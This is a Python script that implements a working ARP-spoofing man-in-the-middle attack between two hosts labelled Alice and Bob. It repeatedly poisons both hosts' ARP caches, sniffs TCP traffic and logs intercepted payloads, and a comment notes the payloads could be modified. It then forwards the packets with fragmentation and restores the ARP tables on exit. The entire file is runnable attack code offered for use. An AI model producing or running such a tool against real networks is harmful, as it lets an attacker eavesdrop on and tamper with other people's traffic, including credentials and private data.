#!/usr/bin/env python3
# coding: utf-8

import argparse
import time
import logging
from multiprocessing import Process
from scapy.all import (
    Ether,
    ARP,
    TCP,
    IP,
    Raw,
    send,
    sniff,
    srp1,
    sendp,
    fragment
)

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)

MTU = 1500  # Maximum Transmission Unit for Ethernet

def get_mac(ip):
    """
    Resolve the MAC address for a given IP by sending an ARP request.
    Returns the MAC as a string, or None if resolution fails.
    """
    logging.info(f"Resolving MAC address for {ip}")
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, op="who-has")
    reply = srp1(arp_request, verbose=0, timeout=2)
    if reply is None:
        logging.error(f"Failed to resolve MAC for {ip}")
        return None
    return reply.src

def spoof(target_ip, spoof_ip):
    """
    Send a spoofed ARP reply to target_ip, claiming that spoof_ip has our MAC address.
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        logging.error(f"Skipping spoof for {target_ip} (no MAC resolved)")
        return
    arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=0)
    logging.info(f"Sent spoofed ARP: {spoof_ip} -> {target_ip}")

def restore(target_ip, source_ip):
    """
    Restore the correct ARP mapping for target_ip by sending a genuine ARP reply.
    """
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac is None or source_mac is None:
        logging.error("Cannot restore ARP entry due to unresolved MAC addresses.")
        return
    arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac,
                       psrc=source_ip, hwsrc=source_mac)
    # Send multiple times to ensure the target updates its ARP cache.
    send(arp_response, count=3, verbose=0)
    logging.info(f"Restored ARP table for {target_ip}")

def modify_and_forward(packet):
    """
    Intercept TCP packets, optionally modify their payload, and forward them.
    If the packet is too long (exceeds MTU), fragment it.
    """
    if packet.haslayer(IP) and packet.haslayer(TCP):
        dst_ip = packet[IP].dst
        new_dst_mac = get_mac(dst_ip)
        if new_dst_mac is None:
            logging.error(f"Cannot forward packet; MAC for {dst_ip} not resolved.")
            return

        # If there's a Raw layer, log its payload.
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            logging.info(f"Intercepted payload: {payload}")
            # Here you could modify the payload if desired.

        # Build a new Ethernet frame with the intercepted IP packet.
        new_packet = Ether(dst=new_dst_mac) / packet[IP]

        # Remove checksums so they get recalculated.
        if new_packet.haslayer(IP):
            del new_packet[IP].chksum
        if new_packet.haslayer(TCP):
            del new_packet[TCP].chksum

        # Check if the packet length exceeds the MTU.
        if len(new_packet) > MTU:
            logging.warning(f"Packet length ({len(new_packet)} bytes) exceeds MTU. Fragmenting...")
            # Determine the maximum payload size for IP fragments (MTU minus Ethernet header).
            fragsize = MTU - len(Ether())
            ip_fragments = fragment(new_packet[IP], fragsize=fragsize)
            for frag in ip_fragments:
                frag_packet = Ether(dst=new_dst_mac) / frag
                sendp(frag_packet, verbose=0)
            logging.info(f"Forwarded {len(ip_fragments)} fragment(s) to {dst_ip}")
        else:
            sendp(new_packet, verbose=0)
            logging.info(f"Forwarded packet to {dst_ip}")

def sniff_tcp():
    """
    Sniff TCP packets and process them with modify_and_forward.
    """
    sniff(filter="tcp", prn=modify_and_forward)

def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing and TCP Packet Forwarding Tool"
    )
    parser.add_argument('alice', help="Alice's IP address")
    parser.add_argument('bob', help="Bob's IP address")
    args = parser.parse_args()

    alice_ip = args.alice
    bob_ip = args.bob

    # Start the TCP sniffing process.
    sniff_process = Process(target=sniff_tcp)
    sniff_process.start()
    logging.info("Started TCP sniffing process.")

    try:
        # Continuously send spoofed ARP responses.
        while True:
            spoof(alice_ip, bob_ip)
            spoof(bob_ip, alice_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        logging.info("Interrupted by user. Restoring ARP tables...")
        restore(alice_ip, bob_ip)
        restore(bob_ip, alice_ip)
    finally:
        if sniff_process.is_alive():
            sniff_process.terminate()
        sniff_process.join()
        logging.info("Exiting program.")

if __name__ == '__main__':
    main()
